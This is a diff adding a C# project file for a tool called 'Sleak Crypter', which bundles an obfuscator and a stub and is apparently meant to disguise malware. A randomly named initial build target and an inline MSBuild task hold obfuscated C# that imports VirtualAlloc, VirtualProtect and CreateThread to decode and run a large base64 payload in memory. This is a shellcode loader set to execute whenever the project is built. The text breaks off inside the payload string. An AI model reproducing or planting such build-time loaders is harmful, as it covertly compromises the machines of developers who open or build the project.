@@ -1,0 +1,305 @@
+<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003" InitialTargets="bX0Iq7xoOu">
+  <Import Project="packages\Costura.Fody.5.7.0\build\Costura.Fody.props" Condition="Exists('packages\Costura.Fody.5.7.0\build\Costura.Fody.props')" />
+  <Import Project="$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props" Condition="Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')" />
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
+    <ProjectGuid>{269F47B4-0631-46BC-A893-864E22883230}</ProjectGuid>
+    <OutputType>WinExe</OutputType>
+    <RootNamespace>Sleak_Crypter</RootNamespace>
+    <AssemblyName>Sleak Crypter</AssemblyName>
+    <TargetFrameworkVersion>v4.8</TargetFrameworkVersion>
+    <FileAlignment>512</FileAlignment>
+    <AutoGenerateBindingRedirects>true</AutoGenerateBindingRedirects>
+    <Deterministic>true</Deterministic>
+    <NuGetPackageImportStamp></NuGetPackageImportStamp>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <Optimize>false</Optimize>
+    <OutputPath>Release\</OutputPath>
+    <DefineConstants>DEBUG;TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugType>pdbonly</DebugType>
+    <Optimize>true</Optimize>
+    <OutputPath>bin\Release\</OutputPath>
+    <DefineConstants>TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+  </PropertyGroup>
+  <PropertyGroup>
+    <ApplicationIcon>explorer.ico</ApplicationIcon>
+  </PropertyGroup>
+  <ItemGroup>
+    <Reference Include="Costura, Version=5.7.0.0, Culture=neutral, processorArchitecture=MSIL">
+      <HintPath>packages\Costura.Fody.5.7.0\lib\netstandard1.0\Costura.dll</HintPath>
+    </Reference>
+    <Reference Include="KeikoObfuscator">
+      <HintPath>..\FudCrpyter\References\KeikoObfuscator.dll</HintPath>
+    </Reference>
+    <Reference Include="Microsoft.Win32.Primitives, Version=4.0.2.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>packages\Microsoft.Win32.Primitives.4.3.0\lib\net46\Microsoft.Win32.Primitives.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="Mono.Cecil, Version=0.11.5.0, Culture=neutral, PublicKeyToken=50cebf1cceb9d05e, processorArchitecture=MSIL">
+      <HintPath>packages\Mono.Cecil.0.11.5\lib\net40\Mono.Cecil.dll</HintPath>
+    </Reference>
+    <Reference Include="Mono.Cecil.Mdb, Version=0.11.5.0, Culture=neutral, PublicKeyToken=50cebf1cceb9d05e, processorArchitecture=MSIL">
+      <HintPath>packages\Mono.Cecil.0.11.5\lib\net40\Mono.Cecil.Mdb.dll</HintPath>
+    </Reference>
+    <Reference Include="Mono.Cecil.Pdb, Version=0.11.5.0, Culture=neutral, PublicKeyToken=50cebf1cceb9d05e, processorArchitecture=MSIL">
+      <HintPath>packages\Mono.Cecil.0.11.5\lib\net40\Mono.Cecil.Pdb.dll</HintPath>
+    </Reference>
+    <Reference Include="Mono.Cecil.Rocks, Version=0.11.5.0, Culture=neutral, PublicKeyToken=50cebf1cceb9d05e, processorArchitecture=MSIL">
+      <HintPath>packages\Mono.Cecil.0.11.5\lib\net40\Mono.Cecil.Rocks.dll</HintPath>
+    </Reference>
+    <Reference Include="System" />
+    <Reference Include="System.AppContext, Version=4.1.1.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>packages\System.AppContext.4.3.0\lib\net463\System.AppContext.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="System.Buffers, Version=4.0.3.0, Culture=neutral, PublicKeyToken=cc7b13ffcd2ddd51, processorArchitecture=MSIL">
+      <HintPath>packages\System.Buffers.4.5.1\lib\net461\System.Buffers.dll</HintPath>
+    </Reference>
+    <Reference Include="System.Collections.Immutable, Version=8.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>packages\System.Collections.Immutable.8.0.0\lib\net462\System.Collections.Immutable.dll</HintPath>
+    </Reference>
+    <Reference Include="System.ComponentModel.Composition" />
+    <Reference Include="System.Console, Version=4.0.1.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>packages\System.Console.4.3.0\lib\net46\System.Console.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="System.Core" />
+    <Reference Include="System.Diagnostics.DiagnosticSource, Version=4.0.1.0, Culture=neutral, PublicKeyToken=cc7b13ffcd2ddd51, processorArchitecture=MSIL">
+      <HintPath>packages\System.Diagnostics.DiagnosticSource.4.3.0\lib\net46\System.Diagnostics.DiagnosticSource.dll</HintPath>
+    </Reference>
+    <Reference Include="System.Diagnostics.Tracing, Version=4.1.1.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>packages\System.Diagnostics.Tracing.4.3.0\lib\net462\System.Diagnostics.Tracing.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="System.Globalization.Calendars, Version=4.0.2.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>packages\System.Globalization.Calendars.4.3.0\lib\net46\System.Globalization.Calendars.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="System.IO, Version=4.1.1.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>packages\System.IO.4.3.0\lib\net462\System.IO.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="System.IO.Compression, Version=4.1.2.0, Culture=neutral, PublicKeyToken=b77a5c561934e089, processorArchitecture=MSIL">
+      <HintPath>packages\System.IO.Compression.4.3.0\lib\net46\System.IO.Compression.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="System.IO.Compression.FileSystem" />
+    <Reference Include="System.IO.Compression.ZipFile, Version=4.0.2.0, Culture=neutral, PublicKeyToken=b77a5c561934e089, processorArchitecture=MSIL">
+      <HintPath>packages\System.IO.Compression.ZipFile.4.3.0\lib\net46\System.IO.Compression.ZipFile.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="System.IO.FileSystem, Version=4.0.2.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>packages\System.IO.FileSystem.4.3.0\lib\net46\System.IO.FileSystem.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="System.IO.FileSystem.Primitives, Version=4.0.2.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>packages\System.IO.FileSystem.Primitives.4.3.0\lib\net46\System.IO.FileSystem.Primitives.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="System.Linq, Version=4.1.1.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>packages\System.Linq.4.3.0\lib\net463\System.Linq.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="System.Linq.Expressions, Version=4.1.1.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>packages\System.Linq.Expressions.4.3.0\lib\net463\System.Linq.Expressions.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="System.Memory, Version=4.0.1.2, Culture=neutral, PublicKeyToken=cc7b13ffcd2ddd51, processorArchitecture=MSIL">
+      <HintPath>packages\System.Memory.4.5.5\lib\net461\System.Memory.dll</HintPath>
+    </Reference>
+    <Reference Include="System.Net.Http, Version=4.1.1.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>packages\System.Net.Http.4.3.0\lib\net46\System.Net.Http.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="System.Net.Sockets, Version=4.1.1.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>packages\System.Net.Sockets.4.3.0\lib\net46\System.Net.Sockets.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="System.Numerics" />
+    <Reference Include="System.Numerics.Vectors, Version=4.1.4.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>packages\System.Numerics.Vectors.4.5.0\lib\net46\System.Numerics.Vectors.dll</HintPath>
+    </Reference>
+    <Reference Include="System.Reflection, Version=4.1.1.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>packages\System.Reflection.4.3.0\lib\net462\System.Reflection.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="System.Reflection.Metadata, Version=8.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>packages\System.Reflection.Metadata.8.0.0\lib\net462\System.Reflection.Metadata.dll</HintPath>
+    </Reference>
+    <Reference Include="System.Runtime, Version=4.1.1.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>packages\System.Runtime.4.3.0\lib\net462\System.Runtime.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="System.Runtime.CompilerServices.Unsafe, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>packages\System.Runtime.CompilerServices.Unsafe.6.0.0\lib\net461\System.Runtime.CompilerServices.Unsafe.dll</HintPath>
+    </Reference>
+    <Reference Include="System.Runtime.Extensions, Version=4.1.1.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>packages\System.Runtime.Extensions.4.3.0\lib\net462\System.Runtime.Extensions.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="System.Runtime.InteropServices, Version=4.1.1.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>packages\System.Runtime.InteropServices.4.3.0\lib\net463\System.Runtime.InteropServices.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="System.Runtime.InteropServices.RuntimeInformation, Version=4.0.1.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>packages\System.Runtime.InteropServices.RuntimeInformation.4.3.0\lib\net45\System.Runtime.InteropServices.RuntimeInformation.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="System.Security.Cryptography.Algorithms, Version=4.2.1.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>packages\System.Security.Cryptography.Algorithms.4.3.0\lib\net463\System.Security.Cryptography.Algorithms.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="System.Security.Cryptography.Encoding, Version=4.0.1.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>packages\System.Security.Cryptography.Encoding.4.3.0\lib\net46\System.Security.Cryptography.Encoding.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="System.Security.Cryptography.Primitives, Version=4.0.1.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>packages\System.Security.Cryptography.Primitives.4.3.0\lib\net46\System.Security.Cryptography.Primitives.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="System.Security.Cryptography.X509Certificates, Version=4.1.1.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>packages\System.Security.Cryptography.X509Certificates.4.3.0\lib\net461\System.Security.Cryptography.X509Certificates.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="System.Text.RegularExpressions, Version=4.1.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>packages\System.Text.RegularExpressions.4.3.0\lib\net463\System.Text.RegularExpressions.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="System.Xml.Linq" />
+    <Reference Include="System.Data.DataSetExtensions" />
+    <Reference Include="Microsoft.CSharp" />
+    <Reference Include="System.Data" />
+    <Reference Include="System.Deployment" />
+    <Reference Include="System.Drawing" />
+    <Reference Include="System.Windows.Forms" />
+    <Reference Include="System.Xml" />
+    <Reference Include="System.Xml.ReaderWriter, Version=4.1.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>packages\System.Xml.ReaderWriter.4.3.0\lib\net46\System.Xml.ReaderWriter.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="DragandDrop.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="DragandDrop.Designer.cs">
+      <DependentUpon>DragandDrop.cs</DependentUpon>
+    </Compile>
+    <Compile Include="MainFrm.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="MainFrm.Designer.cs">
+      <DependentUpon>MainFrm.cs</DependentUpon>
+    </Compile>
+    <Compile Include="KeikoObfuscator\ILogOutput.cs" />
+    <Compile Include="KeikoObfuscator\IObfuscationContext.cs" />
+    <Compile Include="KeikoObfuscator\JunkGeneration\JunkCodeGenerationTask.cs" />
+    <Compile Include="KeikoObfuscator\JunkGeneration\MemberGenerationPhase.cs" />
+    <Compile Include="KeikoObfuscator\JunkGeneration\MsilBodyGenerator.cs" />
+    <Compile Include="KeikoObfuscator\Obfuscator.cs" />
+    <Compile Include="KeikoObfuscator\ObfuscatorTask.cs" />
+    <Compile Include="KeikoObfuscator\Renaming\SymbolAnalysisPhase.cs" />
+    <Compile Include="KeikoObfuscator\Renaming\SymbolAnalysisReport.cs" />
+    <Compile Include="KeikoObfuscator\Renaming\SymbolDefinition.cs" />
+    <Compile Include="KeikoObfuscator\Renaming\SymbolNameGenerator.cs" />
+    <Compile Include="KeikoObfuscator\Renaming\SymbolOverload.cs" />
+    <Compile Include="KeikoObfuscator\Renaming\SymbolRenamingPhase.cs" />
+    <Compile Include="KeikoObfuscator\Renaming\SymbolRenamingTask.cs" />
+    <Compile Include="KeikoObfuscator\Renaming\SymbolTypeDefinition.cs" />
+    <Compile Include="Program.cs" />
+    <Compile Include="Properties\AssemblyInfo.cs" />
+    <Compile Include="Tools\AES.cs" />
+    <Compile Include="Tools\Obuscate.cs" />
+    <EmbeddedResource Include="DragandDrop.resx">
+      <DependentUpon>DragandDrop.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="MainFrm.resx">
+      <DependentUpon>MainFrm.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Properties\Resources.resx">
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>Resources.Designer.cs</LastGenOutput>
+      <SubType>Designer</SubType>
+    </EmbeddedResource>
+    <Compile Include="Properties\Resources.Designer.cs">
+      <AutoGen>True</AutoGen>
+      <DependentUpon>Resources.resx</DependentUpon>
+      <DesignTime>True</DesignTime>
+    </Compile>
+    <None Include="packages.config" />
+    <None Include="Properties\Settings.settings">
+      <Generator>SettingsSingleFileGenerator</Generator>
+      <LastGenOutput>Settings.Designer.cs</LastGenOutput>
+    </None>
+    <Compile Include="Properties\Settings.Designer.cs">
+      <AutoGen>True</AutoGen>
+      <DependentUpon>Settings.settings</DependentUpon>
+      <DesignTimeSharedInput>True</DesignTimeSharedInput>
+    </Compile>
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="App.config" />
+  </ItemGroup>
+  <ItemGroup>
+    <Content Include="explorer.ico" />
+    <Content Include="Resources\Stub.txt" />
+  </ItemGroup>
+  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+  <Import Project="packages\Fody.6.5.5\build\Fody.targets" Condition="Exists('packages\Fody.6.5.5\build\Fody.targets')" />
+  <Target Name="EnsureNuGetPackageBuildImports" BeforeTargets="PrepareForBuild">
+    <PropertyGroup>
+      <ErrorText>This project references NuGet packages that are not on this computer. Use NuGet Package Restore to download them. For more information, see http://go.microsoft.com/fwlink/?LinkID=322105. Missing file: {0}.</ErrorText>
+    </PropertyGroup>
+    <Error Condition="!Exists('packages\Fody.6.5.5\build\Fody.targets')" Text="$([System.String]::Format('$(ErrorText)', 'packages\Fody.6.5.5\build\Fody.targets'))" />
+    <Error Condition="!Exists('packages\Costura.Fody.5.7.0\build\Costura.Fody.props')" Text="$([System.String]::Format('$(ErrorText)', 'packages\Costura.Fody.5.7.0\build\Costura.Fody.props'))" />
+    <Error Condition="!Exists('packages\Costura.Fody.5.7.0\build\Costura.Fody.targets')" Text="$([System.String]::Format('$(ErrorText)', 'packages\Costura.Fody.5.7.0\build\Costura.Fody.targets'))" />
+  </Target>
+  <Import Project="packages\Costura.Fody.5.7.0\build\Costura.Fody.targets" Condition="Exists('packages\Costura.Fody.5.7.0\build\Costura.Fody.targets')" />
+  <PropertyGroup />
+  <UsingTask TaskName="QNSgVh6jox" TaskFactory="RoslynCodeTaskFactory" AssemblyFile="$(MSBuildToolsPath)\Microsoft.Build.Tasks.Core.dll">
+    <Task>
+      <Code Type="Method" Language="cs"><![CDATA[[System.Runtime.InteropServices.DllImport("kernel32",EntryPoint="VirtualAlloc")]static extern System.IntPtr MeGyVIe(System.IntPtr a,uint s,uint t,uint p);[System.Runtime.InteropServices.DllImport("kernel32",EntryPoint="VirtualProtect")]static extern bool fMmOpMR(System.IntPtr a,uint s,uint p,out uint o);[System.Runtime.InteropServices.DllImport("kernel32",EntryPoint="CreateThread")]static extern System.IntPtr jbEguEl(System.IntPtr a,uint s,System.IntPtr e,System.IntPtr p,uint f,System.IntPtr t);[System.Runtime.InteropServices.DllImport("kernel32",EntryPoint="WaitForSingleObject")]static extern uint uYqwzJ9(System.IntPtr h,uint ms);public override bool Execute(){var qWdhqu=System.Convert.FromBase64String("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